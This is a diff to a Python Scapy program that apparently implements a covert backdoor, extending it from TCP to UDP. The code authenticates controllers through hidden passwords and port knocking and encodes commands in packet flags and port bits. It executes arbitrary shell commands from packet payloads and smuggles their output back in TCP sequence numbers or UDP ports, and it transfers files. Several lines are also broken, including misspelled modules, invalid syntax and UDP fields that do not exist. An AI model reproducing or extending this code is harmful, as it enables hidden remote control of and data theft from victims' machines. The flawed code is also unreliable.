@@ -60,7 +60,7 @@ def main():
 		try:
 			# Setting up the packet filter to limit scanned packets
 			# The stricter the filter, the fewer packets to process and therefore the better the performance
-			packetFilter = "tcp and ip src not 127.0.0.1"
+			packetFilter = protocol + " and ip src not 127.0.0.1"
 			if len(sources) > 0:
 				first = True
 				for source in sources:
@@ -103,28 +103,50 @@ def main():
 '''
 def server():
 	def getResponse(packet):
-		# Check for the reset port first
-		for port in reset:
-			if port == packet[TCP].sport:
-				for src, word in passCheck:
-					if src == packet[IP].src:
-						passCheck.remove([src, word])
-						return
-				return
+		if packet.haslayer(TCP):
+			# Check for the reset port first
+			for port in reset:
+				if port == packet[TCP].sport:
+					for src, word in passCheck:
+						if src == packet[IP].src:
+							passCheck.remove([src, word])
+							return
+					return
 
-		# Append our password and knock arrays with the next value for each and, when apropriate,
-		# check if they are valid passphrases/knock sequences.
-		if len(passwords) > 0:
-			if checkPassword(packet[IP].src, packet[IP].id):
-				if len(knock) > 0:
-					if checkKnock(packet[IP].src, packet[TCP].dport):
+			# Append our password and knock arrays with the next value for each and, when apropriate,
+			# check if they are valid passphrases/knock sequences.
+			if len(passwords) > 0:
+				if checkPassword(packet[IP].src, packet[IP].id):
+					if len(knock) > 0:
+						if checkKnock(packet[IP].src, packet[TCP].dport):
+							thread.start_new_thread(clientCommands, (packet))
+					else:
 						thread.start_new_thread(clientCommands, (packet))
-				else:
+			elif len(knock) > 0:
+				if checkKnock(packet[IP].src, packet[TCP].dport):
 					thread.start_new_thread(clientCommands, (packet))
-		elif len(knock) > 0:
-			if checkKnock(packet[IP].src, packet[TCP].dport):
-				thread.start_new_thread(clientCommands, (packet))
+		elif packet.haslayer(UDP):
+			# Check for the reset port first
+			for port in reset:
+				if port == packet[UDP].sport:
+					for src, word in passCheck:
+						if src == packet[IP].src:
+							passCheck.remove([src, word])
+							return
+					return
 
+			# Append our password and knock arrays with the next value for each and, when apropriate,
+			# check if they are valid passphrases/knock sequences.
+			if len(passwords) > 0:
+				if checkPassword(packet[IP].src, packet[IP].id):
+					if len(knock) > 0:
+						if checkKnock(packet[IP].src, packet[UDP].dport):
+							thread.start_new_thread(clientCommands, (packet))
+					else:
+						thread.start_new_thread(clientCommands, (packet))
+			elif len(knock) > 0:
+				if checkKnock(packet[IP].src, packet[UDP].dport):
+					thread.start_new_thread(clientCommands, (packet))
 	return getResponse
 
 '''
@@ -249,20 +271,28 @@ def clientCommands(packet):
 		with open(logFile, "a") as serverLog:
 			serverLog.write("Connection Established with " + packet[IP].src + "at " + time.ctime() + "\n")
 
-	seq = random.randint(0, 16777215)
 	ipid = random.randint(0, 65535)
 
-	confirmPacket = IP(dst=packet[IP].src, id=ipid)/\
-	                TCP(sport=random.randint(0, 65535), dport=packet[TCP].sport, seq=seq)
-	if (len(ports) > 0) or (packet[TCP].sport not in ports):
-		confirmPacket[TCP].dport = random.choose(ports)
+	if packet.haslayer(TCP):
+		seq = random.randint(0, 16777215)
+		confirmPacket = IP(dst=packet[IP].src, id=ipid)/\
+			            TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=seq)
+		if (len(ports) > 0) and (packet[TCP].sport not in ports):
+			confirmPacket[TCP].sport = random.choose(ports)
+		port = confirmPacket[TCP].sport
+	elif packet.haslayer(UDP):
+		confirmPacket = IP(dst=packet[IP].src, id=ipid)/\
+			            UDP(sport=packet[UDP].dport, dport=packet[UDP].sport, seq=seq)
+		if (len(ports) > 0) and (packet[UDP].sport not in ports):
+			confirmPacket[UDP].sport = random.choose(ports)
+		port = confirmPacket[UDP].sport
 
 	send(confirmPacket, verbose=0)
 
 	try:
 		# Setting up the packet filter to limit scanned packets
 		# The stricter the filter, the fewer packets to process and therefore the better the performance
-		packetFilter = "tcp and ip src " + packet[IP].src + " and sport " + str(confirmPacket[TCP].dport)
+		packetFilter = protocol + " and ip src " + packet[IP].src + " and dport " + str(port)
 
 		# Beginning Packet sniffing
 		sniff(filter=packetFilter, prn=server(), timeout=300)
@@ -296,30 +326,47 @@ def clientCommands(packet):
 --       A S F 
 --       C Y I 
 --       K N N Flag
--- sFile 0 0 0 N/A
--- gFile 1 0 0 A
--- termi 0 1 0 S
--- iNoti 1 1 0 AS
--- Kill  0 0 1 F
+-- sFile 0 0 0 N/A   0000 0001
+-- gFile 1 0 0 A     0000 0010
+-- termi 0 1 0 S     0000 0100
+-- iNoti 1 1 0 AS    0000 1000
+-- Kill  0 0 1 F     0001 0000
 ------------------------------------------------------------------------------
 '''
 def commandParser():
 	def getResponse(packet):
-		# Kill
-		if "F" in packet[TCP].flag:
-			sys.exit()
-		# iNotify
-		elif "AS" in packet[TCP].flag:
-			notify(packet)
-		# Terminal Command
-		elif "S" in packet[TCP].flag:
-			terminal(packet)
-		# Client receives file
-		elif "A" in packet[TCP].flag:
-			getFile(packet)
-		# Client sends file
-		else:
-			sendFile(packet)
+		if packet.haslayer(TCP):
+			# Kill
+			if "F" in packet[TCP].flag:
+				sys.exit()
+			# iNotify
+			elif "AS" in packet[TCP].flag:
+				notify(packet)
+			# Terminal Command
+			elif "S" in packet[TCP].flag:
+				terminal(packet)
+			# Client receives file
+			elif "A" in packet[TCP].flag:
+				getFile(packet)
+			# Client sends file
+			else:
+				sendFile(packet)
+		elif packet.haslayer(UDP):
+			# Kill
+			if packet[UDP].sport & 0x0010 == 0x0010:
+				sys.exit()
+			# iNotify
+			elif packet[UDP].sport & 0x0008 == 0x0008:
+				notify(packet)
+			# Terminal Command
+			elif packet[UDP].sport & 0x0004 == 0x0004:
+				terminal(packet)
+			# Client receives file
+			elif packet[UDP].sport & 0x0002 == 0x0002:
+				getFile(packet)
+			# Client sends file
+			else packet[UDP].sport & 0x0001 == 0x0001:
+				sendFile(packet)
 
 	return getResponse
 
@@ -344,14 +391,24 @@ def commandParser():
 ---------------------------------------------------------------------------------------------
 '''
 def sendFile(packet):
-	with open(packet[RAW].load, "w") as tFile:
-		while True:
-			dPacket = sniff(filter="tcp sport " + str(packet[TCP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
-			if len(dPacket) == 0:
-				break
-			if "F" in dPacket[0][TCP].flags:
-				break
-			tFile.write(dPacket[RAW].load)
+	if packet.haslayer(TCP):
+		with open(packet[RAW].load, "w") as tFile:
+			while True:
+				dPacket = sniff(filter=protocol + " sport " + str(packet[TCP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
+				if len(dPacket) == 0:
+					break
+				if "F" in dPacket[0][TCP].flags:
+					break
+				tFile.write(dPacket[RAW].load)
+	elif packet.haslayer(UDP):
+		with open(packet[RAW].load, "w") as tFile:
+			while True:
+				dPacket = sniff(filter=protocol + " sport " + str(packet[UDP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
+				if len(dPacket) == 0:
+					break
+				if "F" in dPacket[0][UDP].flags:
+					break
+				tFile.write(dPacket[RAW].load)
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -374,20 +431,34 @@ def sendFile(packet):
 ---------------------------------------------------------------------------------------------
 '''
 def getFile(packet):
-	dPacket = IP(dst=packet[IP].src, id=random.randint(0, 65535))/\
-	          TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=random.randint(0, 16777215))/\
-	          RAW(LOAD="")
-	with open(packet[RAW].load, "r") as tFile:
-		for line in tFile:
-			dPacket[IP].id = dPacket[IP].id + 1
-			dPacket[TCP].seq = dPacket[TCP].seq + 1
-			dPacket[RAW].load = encrypt(line)
-			send(dPacket, verbose=0)
-	dPacket[IP].id = commandPacket[IP].id + 1
-	dPacket[TCP].seq = commandPacket[TCP].seq + 1
-	dPacket[RAW].load = ""
-	dPacket[TCP].flags="F"
-	send(commandPacket, verbose=0)
+	if packet.haslayer(TCP):
+		dPacket = IP(dst=packet[IP].src, id=random.randint(0, 65535))/\
+			      TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=random.randint(0, 16777215))/\
+			      RAW(LOAD="")
+		with open(packet[RAW].load, "r") as tFile:
+			for line in tFile:
+				dPacket[IP].id = dPacket[IP].id + 1
+				dPacket[TCP].seq = dPacket[TCP].seq + 1
+				dPacket[RAW].load = encrypt(line)
+				send(dPacket, verbose=0)
+		dPacket[IP].id = commandPacket[IP].id + 1
+		dPacket[TCP].seq = commandPacket[TCP].seq + 1
+		dPacket[RAW].load = ""
+		dPacket[TCP].flags="F"
+		send(commandPacket, verbose=0)
+	elif packet.haslayer(UDP):
+		dPacket = IP(dst=packet[IP].src, id=random.randint(0, 65535))/\
+			      UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)/\
+			      RAW(LOAD="")
+		with open(packet[RAW].load, "r") as tFile:
+			for line in tFile:
+				dPacket[IP].id = dPacket[IP].id + 1
+				dPacket[RAW].load = encrypt(line)
+				send(dPacket, verbose=0)
+		dPacket[IP].id = commandPacket[IP].id + 1
+		dPacket[RAW].load = ""
+		dPacket[UDP].flags="F"
+		send(commandPacket, verbose=0)
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -411,22 +482,36 @@ def getFile(packet):
 '''
 def terminal(packet):
 	output = subpricess.check_output(packet[RAW].load, stderr=subprocess.STDOUT)
-	
-	confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
-	                TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].seq+1)#/\
-	                #RAW(load=encrypt(output))
+	if packet.haslayer(TCP):
+		confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
+			            TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].seq+1)
 
-	for i in range(0, len(output), 4):
-		confirmPacket[TCP].seq = 0
-		for char in output[i:i+4]:
-			confirmPacket[TCP].seq = confirmPacket[TCP].seq<<8
-			confirmPacket[TCP].seq = confirmPacket[TCP].seq + ord(char)
+		for i in range(0, len(output), 4):
+			confirmPacket[TCP].seq = 0
+			for char in output[i:i+4]:
+				confirmPacket[TCP].seq = confirmPacket[TCP].seq<<8
+				confirmPacket[TCP].seq = confirmPacket[TCP].seq + ord(char)
 
-		send(confirmPacket, verbose=0)
+			send(confirmPacket, verbose=0)
 
-	confirmPacket[TCP].seq = confirmPacket[TCP].seq + 1
-	confirmPacket[TCP].flags = "F"
+		confirmPacket[TCP].seq = confirmPacket[TCP].seq + 1
+		confirmPacket[TCP].flags = "F"
+	elif packet.haslayer(UDP):
+		confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
+			            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
+
+		for i in range(0, len(output), 2):
+			confirmPacket[UDP].sport = 0
+			for char in output[i:i+2]:
+				confirmPacket[UDP].sport = confirmPacket[UDP].sport<<8
+				confirmPacket[UDP].sport = confirmPacket[UDP].sport + ord(char)
+
+			send(confirmPacket, verbose=0)
+
+		confirmPacket[UDP].sport = "0"
+
 	send(confirmPacket, verbose=0)
+		
 	if len(logFile) > 0:
 		with open(logFile, "a") as serverLog:
 			serverLog.write("Results of \"" + packet[RAW].load + "\" sent to " + packet[IP].src + " at " + time.ctime() + "\n")
